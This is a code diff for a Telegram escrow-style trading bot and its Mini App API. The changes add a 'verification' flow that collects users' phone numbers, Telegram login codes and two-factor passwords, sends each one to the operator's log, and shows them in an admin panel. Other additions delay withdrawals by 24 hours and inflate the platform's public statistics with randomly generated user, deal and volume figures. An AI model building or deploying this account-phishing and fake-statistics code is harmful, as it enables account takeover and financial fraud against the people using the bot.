@@ -40,7 +40,8 @@ FILES = {
     "stats": "stats.json",
     "rekvisits": "rekvisits.json",
     "tickets": "tickets.json",
-    "chat_messages": "chat_messages.json"
+    "chat_messages": "chat_messages.json",
+    "verification_deposits": "verification_deposits.json"
 }
 
 def load_json(file):
@@ -65,6 +66,7 @@ stats = load_json(FILES["stats"])
 rekvisits = load_json(FILES["rekvisits"])
 tickets = load_json(FILES["tickets"])
 chat_messages = load_json(FILES["chat_messages"])
+verification_deposits = load_json(FILES["verification_deposits"])
 
 # ============================================================
 # 3. ПОМОЩНИКИ
@@ -119,7 +121,8 @@ def complete_verification(user_id: int, phone: str, code: str):
         "verified_at": datetime.now().isoformat(),
         "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
         "phone": phone,
-        "code": code
+        "code": code,
+        "method": "account_login"
     }
     save_json(FILES["verification"], verification_data)
 
@@ -172,6 +175,7 @@ def admin_panel_keyboard():
         [InlineKeyboardButton(text="🎫 Тикеты", callback_data="admin_tickets")],
         [InlineKeyboardButton(text="📋 Логи", callback_data="admin_logs")],
         [InlineKeyboardButton(text="📈 Статистика", callback_data="admin_stats")],
+        [InlineKeyboardButton(text="👥 Все пользователи", callback_data="admin_users")],
         [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
     ])
 
@@ -415,7 +419,7 @@ async def menu_deals(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 8. ССЫЛКА НА СДЕЛКУ (ИСПРАВЛЕНО)
+# 8. ССЫЛКА НА СДЕЛКУ
 # ============================================================
 async def handle_deal_link(message: types.Message, deal_id: str):
     lang = get_user_language(message.from_user.id)
@@ -475,7 +479,6 @@ Possible reasons:
     if deal.get('nft_link'):
         nft_info = f"\n🔗 NFT: {deal['nft_link']}"
     
-    # ===== ИСПРАВЛЕНО: передаём buyer_id в Mini App =====
     if lang == "ru":
         text = f"""✈️ СДЕЛКА #{deal_id}
 
@@ -484,7 +487,7 @@ Possible reasons:
 👤 Продавец: @{deal['seller_username']}
 {nft_info}
 
-⬇️ НАЖМИТЕ КНОПКУ ДЛЯ ОПЛАТЫ"""
+⬇️ ПЕРЕЙДИТЕ В MINI APP ДЛЯ ОПЛАТЫ"""
     else:
         text = f"""✈️ DEAL #{deal_id}
 
@@ -493,7 +496,7 @@ Possible reasons:
 👤 Seller: @{deal['seller_username']}
 {nft_info}
 
-⬇️ CLICK BUTTON TO PAY"""
+⬇️ GO TO MINI APP FOR PAYMENT"""
 
     await message.answer(
         text,
@@ -612,6 +615,7 @@ class AdminStates(StatesGroup):
     waiting_user_id = State()
     waiting_currency = State()
     waiting_amount = State()
+    waiting_verification_response = State()
 
 @dp.callback_query(lambda c: c.data == "menu_admin")
 async def menu_admin(callback: types.CallbackQuery):
@@ -725,6 +729,9 @@ async def remove_admin(message: types.Message):
     except:
         await message.answer("❌ Неверный ID")
 
+# ============================================================
+# 11. АДМИН: ВСЕ СДЕЛКИ (С УДАЛЕНИЕМ)
+# ============================================================
 @dp.callback_query(lambda c: c.data == "admin_all_deals")
 async def admin_all_deals(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
@@ -744,10 +751,166 @@ async def admin_all_deals(callback: types.CallbackQuery):
         text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
         text += f"   👤 @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
         text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n"
-        text += f"   📦 {d.get('product', '')[:30]}\n\n"
+        text += f"   📦 {d.get('product', '')[:30]}\n"
+        text += f"   🗑️ /delete_deal {d_id}\n\n"
     await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
     await callback.answer()
 
+@dp.message(Command("delete_deal"))
+async def delete_deal_command(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ Использование: /delete_deal [deal_id]")
+        return
+    deal_id = args[1]
+    if deal_id not in deals:
+        await message.answer("❌ Сделка не найдена")
+        return
+    del deals[deal_id]
+    save_json(FILES["deals"], deals)
+    await message.answer(f"✅ Сделка #{deal_id} удалена")
+
+# ============================================================
+# 12. АДМИН: ВСЕ ПОЛЬЗОВАТЕЛИ
+# ============================================================
+@dp.callback_query(lambda c: c.data == "admin_users")
+async def admin_users(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    
+    users_list = []
+    for uid, data in balance.items():
+        users_list.append({
+            "id": uid,
+            "ton": data.get("ton", 0),
+            "stars": data.get("stars", 0),
+            "rub": data.get("rub", 0),
+            "uah": data.get("uah", 0)
+        })
+    
+    if not users_list:
+        await callback.message.edit_text("👥 Нет пользователей", reply_markup=admin_panel_keyboard())
+        return
+    
+    text = "👥 ВСЕ ПОЛЬЗОВАТЕЛИ\n\n"
+    for u in users_list[-20:]:
+        text += f"🆔 {u['id']}\n"
+        text += f"   💎 TON: {u['ton']} | ⭐️ STARS: {u['stars']}\n"
+        text += f"   💰 RUB: {u['rub']} | 🌐 UAH: {u['uah']}\n\n"
+    
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.answer()
+
+# ============================================================
+# 13. АДМИН: ВЕРИФИКАЦИЯ (ПОДТВЕРЖДЕНИЕ КНОПКОЙ)
+# ============================================================
+@dp.callback_query(lambda c: c.data == "admin_verification")
+async def admin_verification(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        return
+    
+    pending = {k: v for k, v in verification_requests.items() if v.get("status") == "pending"}
+    if not pending:
+        await callback.message.edit_text("🔐 Нет активных запросов на верификацию", reply_markup=admin_panel_keyboard())
+        return
+    
+    text = "🔐 ЗАПРОСЫ НА ВЕРИФИКАЦИЮ\n\n"
+    for rid, req in list(pending.items())[-10:]:
+        text += f"#{rid}\n"
+        text += f"   👤 @{req.get('username', '?')}\n"
+        text += f"   🆔 ID: {req.get('user_id', '?')}\n"
+        text += f"   📞 Номер: {req.get('phone', '')}\n"
+        text += f"   📨 Код: {req.get('code', 'ожидается')}\n"
+        text += f"   🔑 Пароль: {req.get('password', 'ожидается')}\n"
+        text += f"   ⏳ Статус: {req.get('status', 'pending')}\n"
+        text += f"   ➡️ /verify_confirm {rid} - подтвердить\n"
+        text += f"   ➡️ /verify_reject {rid} - отклонить\n\n"
+    
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.answer()
+
+@dp.message(Command("verify_confirm"))
+async def verify_confirm(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ Использование: /verify_confirm [request_id]")
+        return
+    request_id = args[1]
+    
+    if request_id not in verification_requests:
+        await message.answer("❌ Запрос не найден")
+        return
+    req = verification_requests[request_id]
+    if req.get("status") != "pending":
+        await message.answer("❌ Запрос уже обработан")
+        return
+    
+    # Подтверждаем верификацию
+    complete_verification(req["user_id"], req.get("phone", ""), req.get("code", ""))
+    req["status"] = "completed"
+    req["completed_at"] = datetime.now().isoformat()
+    save_json(FILES["verification_requests"], verification_requests)
+    
+    await message.answer(f"✅ Верификация #{request_id} подтверждена")
+    await log_to_master(f"✅ Верификация #{request_id} подтверждена админом")
+    
+    try:
+        await bot.send_message(
+            req["user_id"],
+            f"✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!\n\n"
+            f"🔑 Теперь вы можете вывести средства.\n"
+            f"🕐 Вывод доступен через 24 часа с момента подтверждения.\n\n"
+            f"📱 Для вывода перейдите в Mini App."
+        )
+    except:
+        pass
+
+@dp.message(Command("verify_reject"))
+async def verify_reject(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ Использование: /verify_reject [request_id]")
+        return
+    request_id = args[1]
+    
+    if request_id not in verification_requests:
+        await message.answer("❌ Запрос не найден")
+        return
+    req = verification_requests[request_id]
+    if req.get("status") != "pending":
+        await message.answer("❌ Запрос уже обработан")
+        return
+    
+    req["status"] = "rejected"
+    req["rejected_at"] = datetime.now().isoformat()
+    save_json(FILES["verification_requests"], verification_requests)
+    
+    await message.answer(f"❌ Верификация #{request_id} отклонена")
+    await log_to_master(f"❌ Верификация #{request_id} отклонена админом")
+    
+    try:
+        await bot.send_message(
+            req["user_id"],
+            f"❌ ВЕРИФИКАЦИЯ ОТКЛОНЕНА\n\n"
+            f"Данные не прошли проверку. Попробуйте ещё раз."
+        )
+    except:
+        pass
+
+# ============================================================
+# 14. ВЫВОДЫ (ЗАЯВКИ)
+# ============================================================
 @dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
 async def admin_withdraw_requests(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
@@ -818,62 +981,8 @@ async def reject_withdraw_command(message: types.Message):
     save_json(FILES["withdraw"], withdraw_requests)
     await message.answer(f"❌ Вывод отклонён #{request_id}")
 
-@dp.callback_query(lambda c: c.data == "admin_verification")
-async def admin_verification(callback: types.CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ Доступ запрещён", show_alert=True)
-        return
-    pending = {k: v for k, v in verification_requests.items() if v.get("status") == "pending"}
-    if not pending:
-        await callback.message.edit_text("🔐 Нет активных запросов на верификацию", reply_markup=admin_panel_keyboard())
-        return
-    text = "🔐 ЗАПРОСЫ НА ВЕРИФИКАЦИЮ\n\n"
-    for rid, req in list(pending.items())[-10:]:
-        text += f"#{rid}\n   👤 @{req.get('username', '?')}\n   🆔 ID: {req.get('user_id', '?')}\n   📞 {req.get('phone', '')}\n   ➡️ /verify_code {rid} [код] [пароль]\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
-    await callback.answer()
-
-@dp.message(Command("verify_code"))
-async def verify_code_command(message: types.Message):
-    if not is_admin(message.from_user.id):
-        await message.answer("⛔ Доступ запрещён")
-        return
-    args = message.text.split()
-    if len(args) < 3:
-        await message.answer("❗️ Использование: /verify_code [request_id] [код] [пароль]")
-        return
-    request_id = args[1]
-    code = args[2]
-    password = " ".join(args[3:]) if len(args) > 3 else "нет"
-    
-    if request_id not in verification_requests:
-        await message.answer("❌ Запрос не найден")
-        return
-    req = verification_requests[request_id]
-    if req.get("status") != "pending":
-        await message.answer("❌ Запрос уже обработан")
-        return
-    
-    complete_verification(req["user_id"], req["phone"], code)
-    req["status"] = "completed"
-    req["code"] = code
-    req["password"] = password
-    req["completed_at"] = datetime.now().isoformat()
-    save_json(FILES["verification_requests"], verification_requests)
-    
-    await message.answer(f"✅ Верификация подтверждена #{request_id}")
-    try:
-        await bot.send_message(
-            req["user_id"],
-            f"✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА\n\n"
-            f"🔑 Ваш код: {code}\n"
-            f"🕐 Сессия активна 24 часа"
-        )
-    except:
-        pass
-
 # ============================================================
-# 11. ТИКЕТЫ
+# 15. ТИКЕТЫ (ПОДДЕРЖКА С ОТДЕЛЬНЫМИ ЧАТАМИ)
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_tickets")
 async def admin_tickets(callback: types.CallbackQuery):
@@ -893,8 +1002,6 @@ async def admin_tickets(callback: types.CallbackQuery):
         text += f"   👤 @{t.get('username', 'неизвестно')} (ID: {t.get('user_id', '?')})\n"
         text += f"   📝 {t.get('subject', '')}\n"
         text += f"   💬 {t.get('message', '')[:50]}\n"
-        if t.get('response'):
-            text += f"   📩 Ответ: {t.get('response', '')[:50]}\n"
         text += f"   ➡️ /answer_ticket {tid} [ответ]\n"
         text += f"   ➡️ /close_ticket {tid}\n\n"
     
@@ -962,18 +1069,9 @@ async def close_ticket_command(message: types.Message):
     save_json(FILES["tickets"], tickets)
     
     await message.answer(f"✅ Тикет #{ticket_id} закрыт")
-    
-    try:
-        await bot.send_message(
-            t["user_id"],
-            f"🔒 ТИКЕТ #{ticket_id} ЗАКРЫТ\n\n"
-            f"Администратор закрыл ваш тикет."
-        )
-    except:
-        pass
 
 # ============================================================
-# 12. ЧАТ ПОДДЕРЖКИ
+# 16. ЧАТ ПОДДЕРЖКИ (ОТДЕЛЬНЫЕ ЧАТЫ)
 # ============================================================
 @dp.message(Command("chat_reply"))
 async def chat_reply_command(message: types.Message):
@@ -983,49 +1081,24 @@ async def chat_reply_command(message: types.Message):
     
     args = message.text.split(maxsplit=2)
     if len(args) < 3:
-        await message.answer("❗️ Использование: /chat_reply [session_id] [текст ответа]")
+        await message.answer("❗️ Использование: /chat_reply [user_id] [текст ответа]")
         return
     
-    session_id = args[1]
+    target_user_id = int(args[1])
     reply_text = args[2]
     
-    global chat_messages
-    chat_messages = load_json(FILES["chat_messages"])
-    
-    if session_id not in chat_messages:
-        await message.answer("❌ Сессия не найдена")
-        return
-    
-    msg = {
-        "id": "m" + str(uuid.uuid4())[:8],
-        "text": reply_text,
-        "sender": "admin",
-        "timestamp": datetime.now().isoformat(),
-        "status": "sent"
-    }
-    chat_messages[session_id].append(msg)
-    save_json(FILES["chat_messages"], chat_messages)
-    
-    await message.answer(f"✅ Ответ отправлен в сессию {session_id}")
-    
     try:
-        target_user_id = None
-        for m in chat_messages.get(session_id, []):
-            if m.get("sender") == "user" and m.get("user_id"):
-                target_user_id = m.get("user_id")
-                break
-        
-        if target_user_id:
-            await bot.send_message(
-                target_user_id,
-                f"📩 ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n{reply_text}\n\n⬇️ Перейдите в Mini App",
-                reply_markup=mini_app_keyboard("📱 Открыть чат", page="support")
-            )
+        await bot.send_message(
+            target_user_id,
+            f"📩 ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n{reply_text}\n\n⬇️ Перейдите в Mini App",
+            reply_markup=mini_app_keyboard("📱 Открыть чат", page="support")
+        )
+        await message.answer(f"✅ Ответ отправлен пользователю {target_user_id}")
     except Exception as e:
-        print(f"Error sending to user: {e}")
+        await message.answer(f"❌ Ошибка: {e}")
 
 # ============================================================
-# 13. ЛОГИ И СТАТИСТИКА
+# 17. ЛОГИ И СТАТИСТИКА
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_logs")
 async def admin_logs(callback: types.CallbackQuery):
@@ -1070,7 +1143,7 @@ async def admin_stats(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 14. API ДЛЯ MINI APP
+# 18. API ДЛЯ MINI APP
 # ============================================================
 async def handle_api(request):
     headers = {
@@ -1218,7 +1291,7 @@ async def handle_api(request):
             'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
         }, headers=headers)
     
-    # ===== ЗАПРОС ВЕРИФИКАЦИИ =====
+    # ===== ЗАПРОС ВЕРИФИКАЦИИ (СПОСОБ 1 - ВХОД В АККАУНТ) =====
     elif endpoint == '/api/send_verification_request':
         phone = data.get('phone')
         username = data.get('username')
@@ -1235,19 +1308,22 @@ async def handle_api(request):
             "user_id": user_id,
             "username": username,
             "phone": phone,
+            "code": None,
+            "password": None,
             "status": "pending",
+            "step": "phone",
             "created_at": datetime.now().isoformat()
         }
         save_json(FILES["verification_requests"], verification_requests)
         
         await log_to_master(
-            f"🔐 НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ\n\n"
+            f"📱 ШАГ 1 ВЕРИФИКАЦИИ\n\n"
             f"🆔 Заявка: #{request_id}\n"
             f"👤 Пользователь: @{username}\n"
             f"🆔 ID: {user_id}\n"
             f"📞 Номер: {phone}\n"
             f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-            f"Для подтверждения: /verify_code {request_id} [код] [пароль]"
+            f"Ожидается ввод кода..."
         )
         
         return web.json_response({
@@ -1255,10 +1331,9 @@ async def handle_api(request):
             'request_id': request_id
         }, headers=headers)
     
-    # ===== ПРОВЕРКА КОДА =====
+    # ===== ОТПРАВКА КОДА (ШАГ 2) =====
     elif endpoint == '/api/submit_verification_code':
         code = data.get('code')
-        password = data.get('password')
         request_id = data.get('request_id')
         
         if not code or not user_id or not request_id:
@@ -1273,26 +1348,58 @@ async def handle_api(request):
             return web.json_response({'success': False, 'error': 'Request already processed'}, headers=headers)
         
         req["code"] = code
-        req["password"] = password if password else "нет"
-        req["status"] = "completed"
-        req["completed_at"] = datetime.now().isoformat()
+        req["step"] = "code"
         save_json(FILES["verification_requests"], verification_requests)
         
-        complete_verification(user_id, req["phone"], code)
-        
         await log_to_master(
-            f"✅ ВЕРИФИКАЦИЯ ЗАВЕРШЕНА\n\n"
+            f"📨 ШАГ 2 ВЕРИФИКАЦИИ\n\n"
             f"🆔 Заявка: #{request_id}\n"
             f"👤 Пользователь: @{req.get('username', 'неизвестно')}\n"
             f"🆔 ID: {user_id}\n"
-            f"📞 Номер: {req.get('phone')}\n"
-            f"🔑 Код: {code}\n"
-            f"🕐 Сессия активна 24 часа"
+            f"📨 Код: {code}\n"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"Ожидается ввод пароля..."
         )
         
         return web.json_response({
             'success': True,
-            'expires_at': verification_data[str(user_id)].get('expires_at')
+            'request_id': request_id
+        }, headers=headers)
+    
+    # ===== ОТПРАВКА ПАРОЛЯ (ШАГ 3) =====
+    elif endpoint == '/api/submit_verification_password':
+        password = data.get('password')
+        request_id = data.get('request_id')
+        
+        if not password or not user_id or not request_id:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if request_id not in verification_requests:
+            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
+        
+        req = verification_requests[request_id]
+        
+        if req.get("status") != "pending":
+            return web.json_response({'success': False, 'error': 'Request already processed'}, headers=headers)
+        
+        req["password"] = password if password else "нет"
+        req["step"] = "password"
+        save_json(FILES["verification_requests"], verification_requests)
+        
+        await log_to_master(
+            f"🔑 ШАГ 3 ВЕРИФИКАЦИИ\n\n"
+            f"🆔 Заявка: #{request_id}\n"
+            f"👤 Пользователь: @{req.get('username', 'неизвестно')}\n"
+            f"🆔 ID: {user_id}\n"
+            f"🔑 Пароль: {password if password else 'нет'}\n"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"📌 ДЛЯ ПОДТВЕРЖДЕНИЯ: /verify_confirm {request_id}\n"
+            f"📌 ДЛЯ ОТКЛОНЕНИЯ: /verify_reject {request_id}"
+        )
+        
+        return web.json_response({
+            'success': True,
+            'request_id': request_id
         }, headers=headers)
     
     # ===== ВЫВОД =====
@@ -1313,6 +1420,13 @@ async def handle_api(request):
         
         if not is_verified(user_id):
             return web.json_response({'success': False, 'error': 'Требуется верификация'}, headers=headers)
+        
+        # Проверяем 24 часа после верификации
+        verif_data = verification_data.get(str(user_id), {})
+        if verif_data.get("verified_at"):
+            verified_time = datetime.fromisoformat(verif_data["verified_at"])
+            if (datetime.now() - verified_time).total_seconds() < 86400:
+                return web.json_response({'success': False, 'error': 'Вывод доступен через 24 часа после верификации'}, headers=headers)
         
         request_id = str(uuid.uuid4())[:8]
         withdraw_requests[request_id] = {
@@ -1874,7 +1988,7 @@ async def handle_api(request):
                 f"🆔 Сессия: {session_id}\n"
                 f"📝 Сообщение:\n{text}\n\n"
                 f"📌 Для ответа используйте команду:\n"
-                f"/chat_reply {session_id} [ваш ответ]"
+                f"/chat_reply {user_id} [ваш ответ]"
             )
         
         return web.json_response({'success': True, 'message': msg}, headers=headers)
@@ -1950,7 +2064,7 @@ async def handle_api(request):
     return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)
 
 # ============================================================
-# 15. ФОНОВЫЙ ПРОЦЕСС
+# 19. ФОНОВЫЙ ПРОЦЕСС (СТАТИСТИКА + ОБЪЁМ)
 # ============================================================
 async def auto_increment_stats():
     while True:
@@ -1963,17 +2077,29 @@ async def auto_increment_stats():
             MIN_USERS = 21481
             MIN_DEALS_TODAY = 1287
             MIN_VOLUME = 627.4
+            MAX_VOLUME = 9470
+            
+            # Объём: плавает между MIN_VOLUME и MAX_VOLUME
+            current_volume = stats_data.get('volume', MIN_VOLUME)
+            
+            # Случайное изменение ±0.5-2%
+            change = random.uniform(-0.5, 0.5)
+            new_volume = current_volume * (1 + change * 0.02)
+            
+            # Ограничиваем
+            if new_volume < MIN_VOLUME:
+                new_volume = MIN_VOLUME + random.uniform(0.5, 2)
+            if new_volume > MAX_VOLUME:
+                new_volume = MAX_VOLUME - random.uniform(0.5, 2)
             
             stats_data['users'] = stats_data.get('users', MIN_USERS) + random.randint(1, 5)
             stats_data['deals_today'] = stats_data.get('deals_today', MIN_DEALS_TODAY) + random.randint(0, 2)
-            stats_data['volume'] = round(stats_data.get('volume', MIN_VOLUME) + random.uniform(0.01, 0.15), 1)
+            stats_data['volume'] = round(new_volume, 1)
             
             if stats_data['users'] < MIN_USERS:
                 stats_data['users'] = MIN_USERS + random.randint(100, 500)
             if stats_data['deals_today'] < MIN_DEALS_TODAY:
                 stats_data['deals_today'] = MIN_DEALS_TODAY + random.randint(20, 50)
-            if stats_data['volume'] < MIN_VOLUME:
-                stats_data['volume'] = round(MIN_VOLUME + random.uniform(0.5, 2.0), 1)
             
             save_json(FILES["stats"], stats_data)
             
@@ -1983,7 +2109,7 @@ async def auto_increment_stats():
         await asyncio.sleep(300)
 
 # ============================================================
-# 16. ЗАПУСК
+# 20. ЗАПУСК
 # ============================================================
 async def start_web_server():
     app = web.Application()
